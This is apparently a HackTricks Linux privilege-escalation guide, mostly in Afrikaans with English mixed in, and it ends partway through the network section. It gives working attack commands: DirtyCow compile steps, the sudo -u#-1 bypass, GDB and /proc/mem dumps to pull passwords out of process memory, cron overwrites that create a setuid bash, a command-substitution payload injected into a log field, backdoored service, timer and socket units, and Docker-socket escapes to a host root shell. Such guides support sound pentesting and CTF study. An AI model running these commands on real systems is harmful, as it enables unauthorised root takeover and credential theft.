# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin deur inligting oor die OS wat aan die gang is te versamel.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryfregte op enige gids binne die `PATH`** het, kan jy dalk sekere libraries of binaries hijack:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API keys in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel version en kyk of daar 'n exploit is wat gebruik kan word om privileges te escalate.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernel-weergawes en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes vanaf daardie web te onttrek, kan jy die volgende doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer op die slagoffer uit, kontroleer slegs exploits vir kernel 2.x)

Soek altyd **die kernel-weergawe op Google**, dalk word jou kernel-weergawe in 'n kernel exploit genoem en dan sal jy seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kontroleer **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Lys moontlike verdedigings

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer daaruit ontsnap:


{{#ref}}
docker-security/
{{#endref}}

## Skywe

Kontroleer **what is mounted and unmounted**, waar en waarom. As iets unmounted is, kan jy probeer om dit te mount en na privaat inligting te soek.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Som nuttige binaries op
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kyk ook of **enige kompilator geïnstalleer is**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien te kompileer waar jy dit gaan gebruik (of op een soortgelyke).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Daar kan dalk 'n ou Nagios-weergawe wees (byvoorbeeld) wat uitgebuit kan word om escalating privileges…\
Dit word aanbeveel om die weergawes van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kontroleer of daar verouderde of kwesbare sagteware op die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie kommando's baie inligting sal vertoon wat meestal nutteloos sal wees; daarom word dit aanbeveel om toepassings soos OpenVAS of soortgelyke te gebruik wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte as wat dit behoort te hê** het (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecteer dit deur die `--inspect` parameter in die command line van die proses na te gaan.\
Kyk ook na jou regte oor die proses-binaries, dalk kan jy iemand se binary oorskryf.

### Process monitoring

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te moniteer. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat dikwels uitgevoer word of wanneer 'n stel vereistes vervul is.

### Process memory

Sommige dienste op 'n bediener stoor **credentials in clear text inside the memory**.\
Gewoonlik benodig jy **root privileges** om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat aan jou behoort kan lees**.

> [!WARNING]
> Let wel dat deesdae meeste masjiene **nie ptrace by verstek toelaat nie**, wat beteken dat jy nie ander prosesse wat aan jou ongeprivilegieerde gebruiker behoort kan dump nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke wyse waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs 'n ouer-proses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE capability vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getrace word nie. Sodra dit gestel is, is 'n herbegin benodig om ptracing weer te aktiveer.

#### GDB

As jy toegang tot die geheue van 'n FTP-diens het (byvoorbeeld) kan jy die Heap kry en daarin na die credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrip
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, **maps wys hoe geheue binne daardie proses se** virtuele adresruimte toegeken is; dit wys ook die **toestemmings van elke gemapte gebied**. Die **mem** pseudo-lêer **blootstel die proses se geheue self**. Uit die **maps**-lêer weet ons watter **geheuegebiede leesbaar is** en hul offsets. Ons gebruik hierdie inligting om in die **mem**-lêer te seek en alle leesbare gebiede na 'n lêer te dump.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem benader word.\
Gewoonlik is `/dev/mem` slegs leesbaar deur **root** en **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir Linux

ProcDump is 'n Linux-herbeelding van die klassieke ProcDump tool uit die Sysinternals-suite van tools vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om die geheue van 'n proses te dump kan jy gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan manueel root-vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Kredensiële uit prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die authenticator-proses aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die process dump (sien die vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en in die memory na credentials soek:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die instrument [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **clear-text credentials uit geheue steel** en uit sommige **welbekende lêers**. Dit vereis root-privileges om behoorlik te werk.

| Kenmerk                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktiewe FTP-verbindinge)                  | vsftpd               |
| Apache2 (Aktiewe HTTP Basic Auth-sessies)         | apache2              |
| OpenSSH (Aktiewe SSH-sessies - Sudo-gebruik)      | sshd:                |

#### Soek-regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Kontroleer of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit 'n script wat deur root uitgevoer word (wildcard vuln? kan jy lêers wat root gebruik wysig? gebruik symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-pad

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As binne hierdie crontab die root-gebruiker probeer om 'n opdrag of script uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur die volgende te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

Indien 'n script deur root uitgevoer word en 'n “**\***” binne 'n opdrag voorkom, kan jy dit misbruik om onverwagte dinge te veroorsaak (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard deur 'n pad soos** _**/some/path/\***_ **voorgaan, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation plaasvind in ((...)), $((...)) en let. As 'n root cron/parser onbeheerde log fields lees en dit in 'n arithmetic context invoer, kan 'n attacker 'n command substitution $(...) inject wat as root uitgevoer word wanneer die cron loop.

- Waarom dit werk: In Bash gebeur expansions in hierdie volgorde: parameter/variable expansion, command substitution, arithmetic expansion, dan word splitting en pathname expansion. Dus word 'n waarde soos `$(/bin/bash -c 'id > /tmp/pwn')0` eers substituted (die command word uitgevoer), dan word die oorblywende numeriese `0` gebruik vir die arithmetic sodat die script voortgaan sonder foute.

- Tipiese kwesbare patroon:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Uitbuiting: Kry attacker-controlled teks in die geparseerde log geskryf sodat die numeries-lykende veld 'n command substitution bevat en op 'n syfer eindig. Verseker jou command skryf nie na stdout nie (of herlei dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

As jy **'n cron script kan wysig** wat deur root uitgevoer word, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **directory waarop jy volle toegang het** gebruik, kan dit nuttig wees om daardie folder te verwyder en **'n symlink folder na 'n ander een te skep** wat 'n script bevat wat deur jou beheer word.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron jobs

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daaruit voordeel trek en escalate privileges.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **op die minst-uitgevoerde kommando's te sorteer** en die kommando's wat die meeste uitgevoer is te verwyder, kan jy dit doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin, monitor en lys).

### Onsigbare cronjobs

Dit is moontlik om 'n cronjob **deur 'n carriage return na 'n kommentaar te plaas** (sonder newline-karakter), en die cronjob sal werk. Voorbeeld (let op die carriage return-karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kontroleer of jy enige `.service` file kan skryf; as jy dit kan, **kan jy dit wysig** sodat dit jou **backdoor uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (jy mag dalk moet wag totdat die masjien herbegin).\
Byvoorbeeld, skep jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare service-binêre

Hou in gedagte dat as jy **skryfpermissies oor binaries wat deur services uitgevoer word** het, kan jy hulle verander om backdoors in te sit sodat wanneer die services weer uitgevoer word, die backdoors uitgevoer sal word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
Indien jy agterkom dat jy in enige van die vouers van die pad kan **write**, mag jy dalk in staat wees om **escalate privileges**. Jy moet soek na **relative paths being used on service configurations** lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan ’n **executable** met die **same name as the relative path binary** inside die systemd PATH folder you can write, en wanneer die diens gevra word om die kwesbare aksie (**Start**, **Stop**, **Reload**) uit te voer, sal jou **backdoor** uitgevoer word (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**Lees meer oor services met `man systemd.service`.**

## **Timers**

**Timers** is systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning het vir calendar time events en monotonic time events en asynchroon uitgevoer kan word.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit laat uitvoer om sommige bestaande systemd.unit-eenhede (soos 'n `.service` of 'n `.target`) te begin.
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die unit wat geaktiveer moet word wanneer hierdie `.timer` verstryk. Die argument is 'n unit-naam, waarvan die agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, val hierdie waarde terug op 'n `service` wat dieselfde naam as die timer-unit het, uitgesonderd die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die unit-naam wat geaktiveer word en die unit-naam van die timer-unit identies benoem word, behalwe vir die agtervoegsel.

Daarom, om hierdie permissie te misbruik, sal jy die volgende moet doen:

- Vind 'n systemd unit (soos 'n `.service`) wat 'n **skryfbare binary uitvoer**
- Vind 'n systemd unit wat 'n **relatiewe pad uitvoer** en waaroor jy **skryfregte** het oor die **systemd PATH** (om daardie executable te imiteer)

**Leer meer oor timers met `man systemd.timer`.**

### **Aktiveer Timer**

Om 'n timer te aktiveer benodig jy root privileges en om die volgende uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Let wel: die **timer** is **geaktiveer** deur 'n symlink na dit te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) stel **proseskommunikasie** in staat op dieselfde of verskillende masjiene binne client-server-modelle. Hulle gebruik standaard Unix-deskriptorlêers vir inter-rekenaarkommunikasie en word opgestel deur `.socket`-lêers.

Sockets kan gekonfigureer word met behulp van `.socket`-lêers.

**Leer meer oor sockets met `man systemd.socket`.** In hierdie lêer kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar 'n opsomming word gebruik om aan te **gee waar daar na die socket geluister gaan word** (die pad van die AF_UNIX socket-lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
- `Accept`: Neem 'n boolean-argument. As dit **true** is, word 'n **service instance geskep vir elke inkomende verbinding** en slegs die verbindings-socket word daaraan deurgegee. As dit **false** is, word al die luister-sockets self **aan die gestarte service unit deurgegee**, en slegs een service unit word geskep vir al die verbindings. Hierdie waarde word geïgnoreer vir datagram-sockets en FIFO's waar 'n enkele service unit onvoorwaardelik al die inkomende verkeer hanteer. **Standaard is false**. Vir prestasie-redes word aanbeveel om nuwe daemons slegs so te skryf dat hulle geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls, wat onderskeidelik **uitgevoer word voor** of **na** die luisterende **sockets**/FIFO's geskep en gebind word. Die eerste token van die opdragreël moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat onderskeidelik **uitgevoer word voor** of **na** die luisterende **sockets**/FIFO's gesluit en verwyder word.
- `Service`: Spesifiseer die **service** unit naam **om te aktiveer** by **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Dit staan standaard op die service wat dieselfde naam as die socket dra (met die suffix vervang). In meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Writable .socket files

As jy 'n **skryfbare** `.socket`-lêer vind, kan jy aan die begin van die `[Socket]`-afdeling iets byvoeg soos: `ExecStartPre=/home/kali/sys/backdoor` en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag tot die masjien herbegin word.**\
_Net toe dat die stelsel daardie socket-lêerkonfigurasie moet gebruik, anders sal die backdoor nie uitgevoer word nie_

### Writable sockets

As jy enige **skryfbare socket** identifiseer (_nou praat ons van Unix Sockets en nie van die konfigurasie `.socket`-lêers nie_), dan **kan jy met daardie socket kommunikeer** en moontlik 'n kwesbaarheid uitbuit.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let daarop dat daar moontlik 'n paar **sockets wat na HTTP luister** bestaan vir versoeke (_Ek praat nie van .socket files nie, maar van die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Indien die socket **responds with an HTTP** request, kan jy daarmee **communicate** en moontlik **exploit some vulnerability**.

### Skryfbare Docker Socket

Die Docker-socket, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Volgens verstek is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Skryftoegang tot hierdie socket kan lei tot privilege escalation. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy skryftoegang tot die Docker-socket het, kan jy privilege escalation bereik met die volgende opdragte:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om 'n container met root-vlak toegang tot die gasheer se lêerstelsel te draai.

#### **Gebruik die Docker API direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket steeds gemanipuleer word met die Docker API en `curl` opdragte.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die gasheerstelsel se root directory mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuutgeskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n verbinding met die container te vestig, sodat jy opdragte daarin kan uitvoer.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Na die opstelling van die `socat`-verbinding kan jy opdragte direk in die container uitvoer met root-vlak toegang tot die gasheer se lêerstelsel.

### Ander

Neem kennis dat as jy skryf-toestemmings oor die docker socket het omdat jy **inside the group `docker`** is, het jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) kan jy dit ook kompromitteer.

Kyk na **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy vind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gevorderde inter-Process Communication (IPC) system wat toepassings in staat stel om doeltreffend te kommunikeer en data te deel. Dit is ontwerp met die moderne Linux-stelsel in gedagte en bied 'n robuuste raamwerk vir verskeie vorme van toepassingskommunikasie.

Die stelsel is veelsydig en ondersteun basiese IPC wat die data-uitruiling tussen prosesse verbeter, soortgelyk aan verbeterde UNIX domain sockets. Verder help dit met die uitsending van events of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth daemon oor 'n inkomende oproep kan 'n music player laat demp om die gebruikerservaring te verbeter. D-Bus ondersteun ook 'n remote object system wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig, en sodoende prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n allow/deny model en bestuur boodskaptoestemmings (metode-oproepe, sein-uitsendings, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleidsreëls spesifiseer interaksies met die bus en kan moontlik tot privilege escalation lei deur die uitbuiting van hierdie toestemmings.

'n Voorbeeld van so 'n beleid in /etc/dbus-1/system.d/wpa_supplicant.conf word verskaf, wat toestemmings vir die root-gebruiker beskryf om `fi.w1.wpa_supplicant1` te besit, na te stuur en vanaf te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "default" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus-kommunikasie te ontleed en uit te buit hier:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te ontleed en die posisie van die masjien uit te vind.

### Generiese enumerasie
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Kontroleer altyd network services wat op die masjien loop en waarmee jy nie kon kommunikeer voordat jy toegang daartoe gekry het nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
